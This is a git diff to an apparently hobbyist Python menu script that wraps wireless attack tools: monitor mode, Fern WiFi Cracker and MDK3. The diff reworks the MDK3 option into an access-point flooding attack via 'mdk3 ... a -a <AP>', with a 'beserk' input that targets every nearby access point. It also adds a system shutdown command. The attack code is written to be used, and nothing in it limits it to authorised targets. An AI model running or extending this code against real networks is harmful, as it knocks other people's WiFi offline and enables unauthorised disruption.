@@ -177,11 +177,11 @@ while True:
         time.sleep(0.5)
         print("What do you want to do?")
         time.sleep(0.5)
-        print("1. Scan for interfaces")
+        print("1. Scan for interfaces and enable Monitored Mode")
         print("2. Scan for WiFi networks")
         print("3. Fern WiFi Cracker")
         print("4. Connect to WiFi")
-        print("5. MDK3 Wifi Deauth")
+        print("5. MDK3 AP Deauth")
         print("6. Go back")
         wifi_select = input()
 
@@ -294,17 +294,24 @@ while True:
             os.system('clear')
 
         elif wifi_select == "5":
-            print("Deauth")
+            print("AP Deauth")
             time.sleep(0.5)
             os.system("clear")
-            print("What IP addr do you want to attack? ")
+            print("What AP do you want to attack? ")
             attack_ip = input()
             time.sleep(0.5)
             os.system('clear')
-            try:
-                subprocess.run(["sudo", "mdk3", wifi_interface_choice, "d", attack_ip])
-            except subprocess.CalledProcessError as e:
-                print(f"Error: {e}")
+            if "beserk" in attack_ip:
+                try:
+                    subprocess.run(["sudo", "mdk3", wifi_interface_choice + "mon", "a"])
+                except subprocess.CalledProcessError as e:
+                    print(f"Error: {e}")
+            else:
+                try:
+                    subprocess.run(["sudo", "mdk3", wifi_interface_choice + "mon", "a", "-a", attack_ip])
+                except subprocess.CalledProcessError as e:
+                    print(f"Error: {e}")
+            time.sleep(5)
 
         elif wifi_select == "6":
             time.sleep(0.2)
@@ -603,3 +610,15 @@ while True:
         subprocess.run(['sudo', 'airmon-ng', 'stop', wifi_interface_choice + 'mon'])
         os.system('clear')
         break
+
+    if mode_select == "shutdown":
+        os.system('clear')
+        print("Shutdown in 3 seconds")
+        time.sleep(1)
+        os.system('clear')
+        print("Shutdown in 2 seconds")
+        time.sleep(1)
+        os.system('clear')
+        print("Shutdown in 1 second")
+        time.sleep(1)
+        subprocess.run(['shutdown', '-h', 'now'])
